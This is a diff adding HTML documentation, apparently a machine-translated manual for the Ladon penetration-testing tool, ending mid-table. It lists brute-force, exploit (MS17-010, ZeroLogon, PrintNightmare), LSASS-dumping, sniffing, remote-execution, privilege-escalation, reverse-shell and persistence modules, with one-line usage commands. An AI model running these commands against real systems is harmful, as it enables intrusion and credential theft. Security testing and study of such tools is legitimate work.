+<th>Return Result</th>
+<th>Dependency</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[SmbScan]( <a href="http://k8gege.org/Ladon/SmbScan.html">http://k8gege.org/Ladon/SmbScan.html</a> ）</td>
+<td>SMB password explosion (Windows)</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>[WmiScan]( <a href="http://k8gege.org/Ladon/WmiScan.html">http://k8gege.org/Ladon/WmiScan.html</a> ）</td>
+<td>Wmi password explosion (Windows)</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>[NbtScan]( <a href="http://k8gege.org/Ladon/NbtScan.html">http://k8gege.org/Ladon/NbtScan.html</a> ）</td>
+<td>Ipc password explosion (Windows)</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>[LdapScan]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>AD domain password explosion (Windows)</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>[SmbHashScan]( <a href="http://k8gege.org/Ladon/SmbHashScan.html">http://k8gege.org/Ladon/SmbHashScan.html</a> ）</td>
+<td>SMB hash password blasting (Windows)</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>6</td>
+<td>[WmiHashScan]( <a href="http://k8gege.org/Ladon/WmiHashScan.html">http://k8gege.org/Ladon/WmiHashScan.html</a> ）</td>
+<td>WMI hash password blasting (Windows)</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>7</td>
+<td>[SshScan]( <a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a> ）</td>
+<td>SSH password explosion (Linux)</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>8</td>
+<td>[MssqlScan]( <a href="http://k8gege.org/Ladon/MssqlScan.html">http://k8gege.org/Ladon/MssqlScan.html</a> ）</td>
+<td>MSSQL database password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>9</td>
+<td>[OracleScan]( <a href="http://k8gege.org/Ladon/OracleScan.html">http://k8gege.org/Ladon/OracleScan.html</a> ）</td>
+<td>Oracle database password explosion</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td>[MysqlScan]( <a href="http://k8gege.org/Ladon/MysqlScan.html">http://k8gege.org/Ladon/MysqlScan.html</a> ）</td>
+<td>MySQL database password explosion</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td>[WeblogicScan]( <a href="http://k8gege.org/Ladon/weblogicScan.html">http://k8gege.org/Ladon/weblogicScan.html</a> ）</td>
+<td>Weblogic background password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>12</td>
+<td>[VncScan]( <a href="http://k8gege.org/Ladon/VncScan.html">http://k8gege.org/Ladon/VncScan.html</a> ）</td>
+<td>VNC remote desktop password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>13</td>
+<td>[FtpScan]( <a href="http://k8gege.org/Ladon/ftpscan.html">http://k8gege.org/Ladon/ftpscan.html</a> ）</td>
+<td>Ftp server password explosion</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>14</td>
+<td>[RarScan]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">https://github.com/k8gege/Ladon/wiki/密码爆破</a> -Rar% E6% 96% 87% E4% BB% B6% E5% AF% 86% E7% A0% 81% E7% A0% B4% E8% A7% A3)</td>
+<td>rar compressed package password explosion</td>
+<td>detection process, success password, log file</td>
+<td>rar.exe</td>
+</tr>
+<tr>
+<td>15</td>
+<td>[TomcatScan]( <a href="http://k8gege.org/Ladon/TomcatScan.html">http://k8gege.org/Ladon/TomcatScan.html</a> ）</td>
+<td>Tomcat background login password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>16</td>
+<td>[HttpBasicScan]( <a href="http://k8gege.org/Ladon/HttpbasicScan.html">http://k8gege.org/Ladon/HttpbasicScan.html</a> ）</td>
+<td>httpbasic401 authentication password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>17</td>
+<td>[WinrmScan]( <a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a> ）</td>
+<td>winrm authentication password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+<tr>
+<td>18</td>
+<td>[NbtScan]( <a href="http://k8gege.org/Ladon/NbtScan.html">http://k8gege.org/Ladon/NbtScan.html</a> ）</td>
+<td>Netbios password explosion</td>
+<td>Detection process, successful password, LOG file</td>
+<td></td>
+</tr>
+<tr>
+<td>19</td>
+<td>[DvrScan]( <a href="http://k8gege.org/Ladon/dvrscan.html">http://k8gege.org/Ladon/dvrscan.html</a> ）</td>
+<td>camera password blasting</td>
+<td>detection process, successful password, log file</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x004-vulnerability-detection-exploitation-12">0x004 vulnerability detection / exploitation (12)</h4>
+<p>Example: Ladon MS17010</p>
+<p>Example: Ladon 192.168.1.8/24 MS17010</p>
+<p>Example: Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> WeblogicExp</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[MS17010]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -Ms17010% E6% BC% 8F% E6% B4% 9E% E6% A3% 80% E6% B5% 8b)</td>
+<td>SMB vulnerability detection (cve-2017-0143 / cve-2017-0144 / cve-2017-0145 / cve-2017-0146 / cve-2017-0148)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[SMBGhost]( <a href="http://k8gege.org/Ladon/example.html">http://k8gege.org/Ladon/example.html</a> ）</td>
+<td>SMBHost remote overflow vulnerability detection (CVE-2020-0796)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[WeblogicPoc]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -CVE-2019-2725 Weblogic GetShell Exploit)</td>
+<td>Weblogic vulnerability detection (CVE-2019-2725/[CVE-2018-2894]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -CVE-2018-2894))</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[PhpStudyPoc]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -PhpStudy% E5% 90% 8E% E9% 97% A8% E6% A3% 80% E6% B5% 8B)</td>
+<td>PhpStudy Rear Door Detection (phpstudy 2016/phpstudy 2018)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[ActivemqPoc]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> --Cve-2016-3088)</td>
+<td>ActiveMQ vulnerability detection (cve-2016-3088)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[TomcatPoc]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -CVE-2017-12615)</td>
+<td>Tomcat vulnerability detection (CVE-2017-12615)</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[WeblogicExp]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -Cve-2019-2725-weblogic-getshell-exploit)</td>
+<td>Weblogic vulnerability exploitation (cve-2019-2725)</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[TomcatExp]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">https://github.com/k8gege/Ladon/wiki/漏洞利用</a> -Cve-2017-12615)</td>
+<td>Tomcat vulnerability exploitation (cve-2017-12615)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>[Struts2Poc]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/Ladon/wiki/漏洞扫描</a> -Struts 2% E7% B3% BB% E5% 88% 97% E6% BC% 8F% E6% B4% 9E% E6% A3% 80% E6% B5% 8B)</td>
+<td>Struts 2 vulnerability detection (S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</td>
+</tr>
+<tr>
+<td>10</td>
+<td>[ZeroLogon]( <a href="http://k8gege.org/Ladon/cve-2020-1472.html">http://k8gege.org/Ladon/cve-2020-1472.html</a> ）</td>
+<td>cve-2020-1472 domain control vulnerability exp</td>
+</tr>
+<tr>
+<td>11</td>
+<td>[CVE-2020-0688]( <a href="http://k8gege.org/Ladon/cve-2020-0688.html">http://k8gege.org/Ladon/cve-2020-0688.html</a> ）</td>
+<td>CVE-2020-0688 Exchange Serialization Vulnerability Exploitation</td>
+</tr>
+<tr>
+<td>12</td>
+<td>[CVE-2020-0796]( <a href="http://k8gege.org/p/smbghost_cve_2020_0796.html">http://k8gege.org/p/smbghost_cve_2020_0796.html</a> ）</td>
+<td>SMBHost Win10 remote vulnerability</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x005-Encryption-and-decryption-4">0x005 Encryption and decryption (4)</h4>
+<p>Example: Ladon string enhex</p>
+<p>Example: Ladon EnHex (batch str.txt)</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[EnHex]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86">https://github.com/k8gege/Ladon/wiki/加密解密</a> -%E6% 89% B9% E9% 87% 8FHex% E5% AF% 86% E7% A0% 81)</td>
+<td>Batch Hex password encryption</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[DeHex]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86">https://github.com/k8gege/Ladon/wiki/加密解密</a> -%E6% 89% B9% E9% 87% 8fhex% E5% AF% 86% E7% A0% 81)</td>
+<td>bulk hex password decryption</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[EnBase64]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86">https://github.com/k8gege/Ladon/wiki/加密解密</a> -%E6% 89% B9% E9% 87% 8FBase64% E5% AF% 86% E7% A0% 81)</td>
+<td>Batch Base64 password encryption</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[DeBase64]( <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86">https://github.com/k8gege/Ladon/wiki/加密解密</a> -%E6% 89% B9% E9% 87% 8FBase64% E5% AF% 86% E7% A0% 81)</td>
+<td>Batch Base64 password decryption</td>
+</tr>
+</tbody>
+</table>
+<p>####0x006 Download function (2)</p>
+<p>The download function is mainly used for intranet file transfer or downloading VPS files to the target machine</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>HttpDownLoad</td>
+<td>HTTP Download</td>
+<td>Ladon HttpDownLoad <a href="http://k8gege.org/test.exe">http://k8gege.org/test.exe</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>ftpdownload</td>
+<td>FTP download</td>
+<td>Ladon ftpdownload 127.0.0.1:21 admin admin test.exe</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x007-network-sniffing-3">0x007 network sniffing (3)</h4>
+<p>Based on Socket RAW sniffing, Winpcap does not need to be installed, but administrator permissions are required</p>
+<p>It is mainly used to discover the surviving machines in the intranet or sniff the password of the administrator to log in to FTP or web sites</p>
+<p>Other functions may be added later, and a special sniffing tool may be written</p>
+<p>PS: At present, most sniffing tools on the Internet are based on Winpcap packet capture. Some machines have restrictions on it, and will prompt that the network card cannot be found and cannot be sniffed.</p>
+<p>The point is that many programs are either GUI or can only be used under Linux. If you use py’s scapy (WinPcap) to realize discovery, the program can reach 48m</p>
+<p>Of course, it can also be used to find the online address of a malicious trojan (for example, the netstat sent by Cobal strike in one minute by default may not be visible)</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[FtpSniffer/SnifferFtp]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>FTP password sniffer</td>
+<td>Ladon FTP sniffer 192.168.1.5</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[HttpSniffer/SnifferHTTP]( <a href="http://k8gege.org/p/qqkey.html">http://k8gege.org/p/qqkey.html</a> ）</td>
+<td>HTTP password sniffing</td>
+<td>Ladon httpsniffer 192.168.1.5</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[Sniffer]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>Network sniffer (source address, target address)</td>
+<td>Ladon Sniffer</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x008-password-reading-3">0x008 password reading (3)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[EnumIIS/IisPwd]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>IIS site password reading</td>
+<td>Ladon EnumIIS or Ladon IisPwd</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[DumpLsass ]( <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> ）</td>
+<td>dumplsass memory password</td>
+<td>Ladon dumplsass</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[web]( <a href="http://k8gege.org/Ladon/GetWinAuth.html">http://k8gege.org/Ladon/GetWinAuth.html</a> ）</td>
+<td>Capture Win Password</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x009-Information-Collection-12">0x009 Information Collection (12)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[EnumProcess/ProcessList/tasklist]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>Process Details</td>
+<td>Ladon EnumProcess or Ladon Tasklist</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[GetCmdLine/CmdLine]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>get command line parameters</td>
+<td>Ladon CmdLine or Ladon CmdLine cmd.exe</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[GetInfo/GetInfo2]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>Get basic penetration information</td>
+<td>Ladon GetInfo or Ladon GetInfo2</td>
+</tr>
+<tr>
+<td>4</td>
+<td>GetPipe</td>
+<td>View native named pipes</td>
+<td>Ladon GetPipe</td>
+</tr>
+<tr>
+<td>5</td>
+<td>rdlog</td>
+<td>view 3389 connection records</td>
+<td>Ladon rdlog</td>
+</tr>
+<tr>
+<td>6</td>
+<td>queryadmin</td>
+<td>view administrator group user</td>
+<td>Ladon queryadmin</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[NetVer]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>view the installation Net version</td>
+<td>Ladon netver or Ladon netversion</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[PsVer]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>View PowerShell version</td>
+<td>Ladon PsVersion or Ladon PSVersion</td>
+</tr>
+<tr>
+<td>9</td>
+<td>whoami</td>
+<td>View the current user and privileges</td>
+<td>Ladon whoami</td>
+</tr>
+<tr>
+<td>10</td>
+<td>recent</td>
+<td>View the files recently accessed by the user</td>
+<td>Ladon recent</td>
+</tr>
+<tr>
+<td>11</td>
+<td>allver</td>
+<td>get the list of installed programs</td>
+<td>Ladon allver</td>
+</tr>
+<tr>
+<td>12</td>
+<td>[Usblog]( <a href="http://k8gege.org/p/56393.html">http://k8gege.org/p/56393.html</a> ）</td>
+<td>view USB usage record</td>
+<td>Ladon usblog</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x010-Remote-execution-8">0x010 Remote execution (8)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[WmiExec]( <a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a> ）</td>
+<td>135 port execute command</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td>[PsExec]( <a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a> ）</td>
+<td>445 port execution command</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td>[AtExec]( <a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a> ）</td>
+<td>445 port execution command</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td>[SshExec]( <a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a> ）</td>
+<td>22 port execute command</td>
+<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td>[JspShell]( <a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a> ）</td>
+<td>Jsp executes the command in one sentence</td>
+<td><a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td>[WebShell]( <a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a> ）</td>
+<td>webshell execute command</td>
+<td><a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td><a href="http://k8gege.org/Ladon/webshell.html">WebShell</a></td>
+<td>CVE-2020-17144</td>
+<td><a href="http://k8gege.org/p/CVE-2020-17144.html">http://k8gege.org/p/CVE-2020-17144.html</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td>[WinrmExec]( <a href="http://k8gege.org/Ladon/WinrmExec.html">http://k8gege.org/Ladon/WinrmExec.html</a> ）</td>
+<td>5895 port execution command</td>
+<td><a href="http://k8gege.org/Ladon/WinrmExec.html">http://k8gege.org/Ladon/WinrmExec.html</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td>[SmbExec]( <a href="http://k8gege.org/Ladon/SmbExec.html">http://k8gege.org/Ladon/SmbExec.html</a> ）</td>
+<td>Port 445 HASH execution command</td>
+<td><a href="http://k8gege.org/Ladon/SmbExec.html">http://k8gege.org/Ladon/SmbExec.html</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x011-Right-raising-and-right-lowering-9">0x011 Right raising and right lowering (9)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[BypassUac]( <a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a> ）</td>
+<td>Bypass UAC execution, support Win7-Win10</td>
+<td>Ladon Bypass Uac c: 1.exe or Ladon Bypass Uac c: 1.bat</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[GetSystem]( <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> ）</td>
+<td>run the program</td>
+<td>Ladon getsystem CMD Exe or Ladon getsystem CMD exe explorer</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[Runas]( <a href="http://k8gege.org/Ladon/runas.html">http://k8gege.org/Ladon/runas.html</a> ）</td>
+<td>Simulate the user to execute the command</td>
+<td>Ladon Runas user pass cmd</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[ms16135]( <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> ）</td>
+<td>Right to SYSTEM</td>
+<td>Ladon ms16135 whoami</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[BadPotato]( <a href="http://k8gege.org/Ladon/potato.html">http://k8gege.org/Ladon/potato.html</a> ）</td>
+<td>IIS or the service user is authorized to SYSTEM</td>
+<td>Ladon BadPotato cmdline</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[SweetPotato]( <a href="http://k8gege.org/Ladon/potato.html">http://k8gege.org/Ladon/potato.html</a> ）</td>
+<td>IIS or the service user is authorized to SYSTEM</td>
+<td>Ladon SweetPotato cmdline</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[SweetPotato]( <a href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html">http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html</a> ）</td>
+<td>Win10/2016 to System</td>
+<td>Ladon SweetPotato cmdline</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[RDPHijack]( <a href="http://k8gege.org/Ladon/RdpHijack.html">http://k8gege.org/Ladon/RdpHijack.html</a> ）</td>
+<td>remote desktop session hijacking</td>
+<td>Ladon rdphijack sessionid</td>
+</tr>
+<tr>
+<td>9</td>
+<td>[CVE-2021-1675]( <a href="http://k8gege.org/p/CVE-2021-1675.html">http://k8gege.org/p/CVE-2021-1675.html</a> ）</td>
+<td>Printer vulnerability authorization</td>
+<td>Ladon CVE-2021-1675 c: evil.dll</td>
+</tr>
+</tbody>
+</table>
+<h4 id="0x012-Rebound-shell-4">0x012 Rebound shell (4)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Protocol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[netcat]( <a href="http://k8gege.org/Ladon/ReverseShell.html">http://k8gege.org/Ladon/ReverseShell.html</a> ）</td>
+<td>Bounce Shell Series Tutorial</td>
+<td>TCP</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[MSF_Shell]( <a href="http://k8gege.org/Ladon/ReverseShell.html">http://k8gege.org/Ladon/ReverseShell.html</a> ）</td>
+<td>rebound shell series tutorial</td>
+<td>TCP / HTTP / HTTPS</td>
+</tr>
+<tr>
+<td>3</td>
+<td>[PowerCat]( <a href="http://k8gege.org/Ladon/ReverseShell.html">http://k8gege.org/Ladon/ReverseShell.html</a> ）</td>
+<td>rebound shell series tutorial</td>
+<td>TCP / UDP / ICMP</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[MSF_Meter]( <a href="http://k8gege.org/Ladon/ReverseShell.html">http://k8gege.org/Ladon/ReverseShell.html</a> ）</td>
+<td>Bounce Shell Series Tutorial</td>
+<td>TCP/HTTP/HTTPS</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[runas]( <a href="http://k8gege.org/Ladon/runas.html">http://k8gege.org/Ladon/runas.html</a> ）</td>
+<td>Runas rebounds shell</td>
+<td>TCP</td>
+</tr>
+</tbody>
+</table>
+<h4 id="Port-forwarding">Port forwarding</h4>
+<p>1 | [PortTran]( <a href="http://k8gege.org/Ladon/porttran.html">http://k8gege.org/Ladon/porttran.html</a> ）| Intranet port forwarding<br>
+2 | [netsh]( <a href="http://k8gege.org/Ladon/netsh.html">http://k8gege.org/Ladon/netsh.html</a> ）| System command port forwarding</p>
+<h4 id="0x014-other-functions-12">0x014 other functions (12)</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Module name</th>
+<th>Function description</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>[EnableDotNet]( <a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a> ）</td>
+<td>One click enable Net 3.5 (not enabled by default in 2008)</td>
+<td>Ladon enabledotnet</td>
+</tr>
+<tr>
+<td>2</td>
+<td>[gethtml]( <a href="http://k8gege.org/p/39070.html">http://k8gege.org/p/39070.html</a> ）</td>
+<td>get the HTML source code of intranet site</td>
+<td>Ladon gethtml <a target="_blank" rel="noopener" href="http://192.168.1.1">http://192.168.1.1</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td>[CheckDoor]( <a href="http://k8gege.org/p/55476.html">http://k8gege.org/p/55476.html</a> ）</td>
+<td>detection back door (disclosed online for many years)</td>
+<td>Ladon checkdoor or Ladon autorun</td>
+</tr>
+<tr>
+<td>4</td>
+<td>[GetIP]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>get local intranet IP and external IP</td>
+<td>Ladon getip</td>
+</tr>
+<tr>
+<td>5</td>
+<td>[Open3389]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>one click Open 3389</td>
+<td>Ladon open3389</td>
+</tr>
+<tr>
+<td>6</td>
+<td>[ActiveAdmin]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>Activate the built-in user Administrator</td>
+<td>Ladon ActiveAdmin</td>
+</tr>
+<tr>
+<td>7</td>
+<td>[ActiveGuest]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>activate built-in user guest</td>
+<td>Ladon activeguest</td>
+</tr>
+<tr>
+<td>8</td>
+<td>[RunPS]( <a href="http://k8gege.org/">http://k8gege.org/</a> ）</td>
+<td>no PowerShell Exe Execute PowerShell script</td>
+<td>Ladon RunPS *. ps1</td>
+</tr>
+<tr>
+<td>9</td>
+<td>regauto</td>
+<td>add registry run startup key</td>
+<td></td>
+</tr>
+<tr>
+<td>10</td>
+<td>SC</td>
+<td>service plus startup item (system permission)</td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td>SC</td>
+<td>service executor (system authority)</td>
+<td></td>
+</tr>
+<tr>
+<td>12</td>
+<td>at</td>
+<td>plan execution program (no time required) (system permission)</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Note: The above is only the primary usage of the built-in modules of the tool. Please refer to the usage documentation for external plug-ins or more advanced usage</p>
+<p>Intermediate usage: INI file configuration, calling arbitrary programs, system commands, and batch utilization of ready-made exp in various languages</p>
+<p>Advanced usage: exp generator generates POC with one click, and uses plug-ins written in various languages to extend Ladon’s scanning ability.</p>
+<h3 id="External-plug-in-module-21">External plug-in module (21)</h3>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Function</th>
+<th>Implementation language</th>
+<th>Function description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>vulnerability scanning</td>
+<td>C language</td>
+<td>[CVE 2019-0708 windows RDP 3389 vulnerability batch detection]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">https://github.com/k8gege/K8CScan/wiki/漏洞扫描</a> -CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Vulnerability exploitation</td>
+<td>Exp generator</td>
+<td>[ThinkPap5.0.22 5.1.29 RCE GetShell Exploit]（ <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">https://github.com/k8gege/K8CScan/wiki/漏洞利用</a> -ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Vulnerability exploitation</td>
+<td>Python</td>
